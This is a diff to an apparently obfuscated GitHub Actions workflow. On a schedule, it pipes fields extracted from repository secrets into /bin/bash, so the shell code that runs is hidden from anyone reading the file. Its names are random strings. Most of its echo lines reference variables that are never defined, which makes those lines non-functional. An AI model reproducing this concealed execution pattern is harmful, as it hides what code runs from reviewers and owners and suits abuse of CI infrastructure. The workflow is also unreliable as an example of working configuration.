@@ -3,8 +3,8 @@ name: mingquanshu2121
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
-jobs:  # 18488
+    - cron: '47 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +12,15 @@ jobs:  # 18488
       - uses: actions/checkout@v4
       - name: mingquanshu2121
         env:
-          ez555: ${{ secrets.ez555 }}
+          x4: ${{ secrets.x4 }}
         run: |
-          echo $ez555 | jq -r .wv0 | /bin/bash
-          echo $j718 | jq -r .clmg844 | /bin/bash
-          echo $dg5 | jq -r .etf407 | /bin/bash
-          echo $wenuo86848 | jq -r .wr101 | /bin/bash
-          echo $nm073 | jq -r .cwst22 | /bin/bash
-          echo $grhh20736 | jq -r .jiln0838 | /bin/bash
+          echo $x4 | jq -r .vkhdq4378 | /bin/bash
+          echo $qn06 | jq -r .vpbu812 | /bin/bash
+          echo $ojb7 | jq -r .gvyer5 | /bin/bash
+          echo $ro49178 | jq -r .su0163 | /bin/bash
+          echo $p1047 | jq -r .inn4067 | /bin/bash
+          echo $dkl3 | jq -r .np1050 | /bin/bash
+          echo $i71241 | jq -r .xn621 | /bin/bash
+          echo $ty9437 | jq -r .pjwas02307 | /bin/bash
+          echo $xlxhx7900 | jq -r .qo2790 | /bin/bash
 
